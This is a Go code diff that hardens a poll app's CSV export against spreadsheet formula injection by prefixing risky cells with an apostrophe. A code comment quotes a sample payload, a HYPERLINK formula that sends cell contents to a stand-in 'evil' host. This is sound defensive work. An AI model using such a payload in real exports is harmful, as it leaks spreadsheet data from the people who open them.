@@ -4,6 +4,7 @@ import (
 	"encoding/csv"
 	"fmt"
 	"net/http"
+	"strings"
 	"time"
 
 	"github.com/lporcheron/quorum/internal/ics"
@@ -95,7 +96,7 @@ func (h *Handler) ExportCSV(w http.ResponseWriter, r *http.Request) {
 	for _, o := range v.Options {
 		header = append(header, templates.OptionLabel(loc.Lang, o, p.TZ()))
 	}
-	if err := cw.Write(header); err != nil {
+	if err := writeCSVRow(cw, header); err != nil {
 		return
 	}
 	for _, pa := range v.Participants {
@@ -103,7 +104,7 @@ func (h *Handler) ExportCSV(w http.ResponseWriter, r *http.Request) {
 		for _, o := range v.Options {
 			row = append(row, string(v.Votes[pa.ID][o.ID]))
 		}
-		if err := cw.Write(row); err != nil {
+		if err := writeCSVRow(cw, row); err != nil {
 			return
 		}
 	}
@@ -112,8 +113,32 @@ func (h *Handler) ExportCSV(w http.ResponseWriter, r *http.Request) {
 		t := v.Tallies[i]
 		tally = append(tally, fmt.Sprintf("%d/%d/%d", t.Yes, t.IfNeedBe, t.No))
 	}
-	cw.Write(tally) //nolint:errcheck // best-effort trailer
+	writeCSVRow(cw, tally) //nolint:errcheck // best-effort trailer
 	cw.Flush()
+}
+
+// formulaSigils are the characters that make a spreadsheet treat a cell
+// as an expression rather than text.
+const formulaSigils = "=+-@\t\r"
+
+// writeCSVRow escapes the row before writing it. Excel and LibreOffice
+// evaluate any cell opening with one of formulaSigils, and CSV quoting
+// does not stop them — so a participant who signs the poll as
+// =HYPERLINK("http://evil/"&A1,"Click") gets that formula run in the
+// organizer's spreadsheet, with the sheet's contents to hand. A leading
+// apostrophe is the spreadsheet's own way of saying "this is text".
+//
+// Every cell goes through it, not just the participant-supplied ones:
+// the columns this export carries will change, and the next one to hold
+// user input should be covered the day it is added, not the day someone
+// notices.
+func writeCSVRow(w *csv.Writer, cells []string) error {
+	for i, c := range cells {
+		if c != "" && strings.IndexByte(formulaSigils, c[0]) >= 0 {
+			cells[i] = "'" + c
+		}
+	}
+	return w.Write(cells)
 }
 
 // finalizedOptionLabel resolves the chosen option's label for banners.
